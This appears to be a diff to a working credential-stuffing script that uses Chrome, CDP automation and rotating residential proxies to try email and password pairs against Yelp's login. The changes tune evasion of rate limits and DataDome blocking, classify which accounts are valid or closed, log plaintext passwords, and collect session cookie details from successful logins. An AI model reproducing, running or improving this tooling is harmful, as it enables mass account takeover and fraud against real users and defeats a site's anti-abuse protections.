@@ -15,7 +15,8 @@ try { IDN = identity.load(process.env.IDENTITY); } catch (e) {}
 // Two hard limits drive the pacing:
 //   1) ~15 POST / 60 s per IP  -> 429 above that
 //   2) ~30 POST per sticky IP  -> 403 (DataDome) from POST 32 onwards
-// So: pace to <=13/min, spend at most 28 POST on an IP, then rotate.
+// So: 15 POST per IP, rotate by relaunching Chrome. 15 also sits under the 429 window,
+// which means no pacing sleep is needed inside a chunk.
 //
 // env: BID LIST OUT PU_BASE PW [MAXT] [SITEKEY] [PACE] [BUDGET]
 const BID = parseInt(process.env.BID || '0', 10);
@@ -23,8 +24,8 @@ const LIST = process.env.LIST, OUT = process.env.OUT;
 const PU_BASE = process.env.PU_BASE, PW = process.env.PW;
 const MAXT = parseInt(process.env.MAXT || '900000', 10);
 const SITEKEY = process.env.SITEKEY || '6660d4df-1884-4ac6-a933-e5f3bd460946';
-const PACE = parseInt(process.env.PACE || '12', 10);      // max POST per rolling minute
-const BUDGET = parseInt(process.env.BUDGET || '28', 10);  // max POST per sticky IP
+const PACE = parseInt(process.env.PACE || '14', 10);      // max POST per rolling minute
+const BUDGET = parseInt(process.env.BUDGET || '15', 10);  // max POST per sticky IP
 
 const PH = process.env.PROXY_HOST || 'pr.oxylabs.io';
 const PP = parseInt(process.env.PROXY_PORT || '7777', 10);
@@ -65,7 +66,7 @@ const freePort = () => new Promise((res, rej) => { const s = net.createServer();
 async function j(u, n) { for (let i = 0; i < n; i++) { try { const r = await fetch(u); return await r.json(); } catch (e) { await sleep(400); } } return null; }
 const rec = o => { fs.appendFileSync(OUT, JSON.stringify(o) + '\n'); console.log(JSON.stringify(o)); };
 let chromeRef = null;
-// Abort paths used to `return` with the WebSocket and relay still open, so node never exited
+// Abort paths used to return with the WebSocket and relay still open, so node never exited
 // and pool.ps1 waited on a dead worker.
 const bail = (why, extra) => {
   rec(Object.assign({ event: 'abort', why }, extra || {}));
@@ -125,6 +126,7 @@ function paceDelay() {
     '--proxy-server=http://127.0.0.1:' + LP, '--remote-debugging-port=' + CP,
     'https://www.yelp.com/login/'
   ], { stdio: 'ignore' });
+  chromeRef = chrome;
 
   const ver = await j('http://127.0.0.1:' + CP + '/json/version', 40);
   if (!ver) { bail('cdp'); return; }
@@ -234,7 +236,7 @@ function paceDelay() {
   let csrf = await ev(`(function(){var i=document.querySelector('#ajax-login input[name=csrftok]');return i?i.value:'';})()`);
   rec({ event: 'csrf', len: (csrf || '').length });
 
-  let validated = 0, success = 0, unable = 0, link = 0, closed = 0, unknown = 0, r429 = 0, r403 = 0, tokFail = 0, posted = 0;
+  let validated = 0, success = 0, unable = 0, link = 0, closed = 0, unknown = 0, r429 = 0, r403 = 0, r407 = 0, tokFail = 0, posted = 0;
   const successes = [], msAll = [], tokAll = [], postAll = [];
   let blocked = false;
 
@@ -276,21 +278,22 @@ function paceDelay() {
       let js = null; try { js = JSON.parse(r.body || 'null'); } catch (e) {}
 
       if (r.status === 429) { r429++; rec({ event: 'r429', at: i + 1, posted }); await sleep(13000); continue; }
-      if (r.status === 403) {
-        r403++;
-        rec({ event: 'r403', at: i + 1, posted, body: (r.body || '').slice(0, 60) });
+      if (r.status === 403 || r.status === 407) {
+        if (r.status === 403) r403++; else r407++;
+        rec({ event: r.status === 403 ? 'r403' : 'r407', at: i + 1, posted, body: (r.body || '').slice(0, 60) });
         blocked = true;
         break;
       }
 
+      const text = (js && (js.errors || []).join(' ')) || (r.body || '');
       const isSuccess = !!(js && js.success === true);
-      const isInvalid = !!(js && js.error_fields && js.error_fields.indexOf('password') >= 0 && /incorrect/i.test((js.errors || []).join(' ')));
-      const isUnable = !!(js && /unable to log you in/i.test((js.errors || []).join(' ')));
-      const isLink = !!(js && (js.require_link || js.magic_link) && !isSuccess);
-      const isClosed = !!(js && /has been closed/i.test((js.errors || []).join(' ')));
+      const isClosed = /has been closed/i.test(text);
+      const isInvalid = !!(js && js.error_fields && js.error_fields.indexOf('password') >= 0 && /incorrect/i.test(text));
+      const isUnable = /unable to log you in/i.test(text);
+      const isLink = !!(js && (js.require_link || js.magic_link) && !isSuccess) || /login link|magic link/i.test(text);
 
-      if (isSuccess) success++; else if (isInvalid) validated++; else if (isUnable) unable++;
-      else if (isLink) link++; else if (isClosed) closed++; else unknown++;
+      if (isSuccess) success++; else if (isClosed) closed++; else if (isInvalid) validated++;
+      else if (isUnable) unable++; else if (isLink) link++; else unknown++;
 
       let profileStatus = null, zss = null;
       if (isSuccess) {
@@ -301,7 +304,8 @@ function paceDelay() {
         zss = all.filter(x => x.name === 'zss').map(x => ({ d: x.domain, len: (x.value || '').length }));
         successes.push({ email: c.email, pass: c.pass, profileStatus, zss });
       }
-      rec({ i: i + 1, email: c.email, status: r.status, success: isSuccess, validated: isInvalid, unable: isUnable, link: isLink, closed: isClosed, tokLen: String(tok || '').length, tokMs, postMs, body: (r.body || '').slice(0, 110), profileStatus, zss: zss ? zss.length : 0, ms: tokMs + postMs });
+      const zssLen = zss && zss.length ? Math.max(...zss.map(x => x.len)) : 0;
+      rec({ i: i + 1, email: c.email, pass: c.pass, status: r.status, success: isSuccess, validated: isInvalid, unable: isUnable, link: isLink, closed: isClosed, tokLen: String(tok || '').length, tokMs, postMs, body: (r.body || '').slice(0, 110), profileStatus, zss: zss ? zss.length : 0, zssLen, ms: tokMs + postMs });
       fin = true;
 
       if (isSuccess) {
@@ -317,7 +321,7 @@ function paceDelay() {
 
   const avg = a => a.length ? Math.round(a.reduce((x, y) => x + y, 0) / a.length) : 0;
   rec({ event: 'summary', mode: 'fast', processed: msAll.length, posted, validated, success, unable, link, closed, unknown,
-        r429, r403, tokFail, blocked, paceSleepMs, avgTokMs: avg(tokAll), avgPostMs: avg(postAll), avgMs: avg(msAll),
+        r429, r403, r407, tokFail, blocked, paceSleepMs, avgTokMs: avg(tokAll), avgPostMs: avg(postAll), avgMs: avg(msAll),
         secs: Math.round((Date.now() - t0) / 1000), successes });
 
   try { ws.close(); } catch (e) {}
@@ -326,4 +330,5 @@ function paceDelay() {
   try { relay.close(); } catch (e) {}
   setTimeout(() => process.exit(0), 800);
 })();
+
 
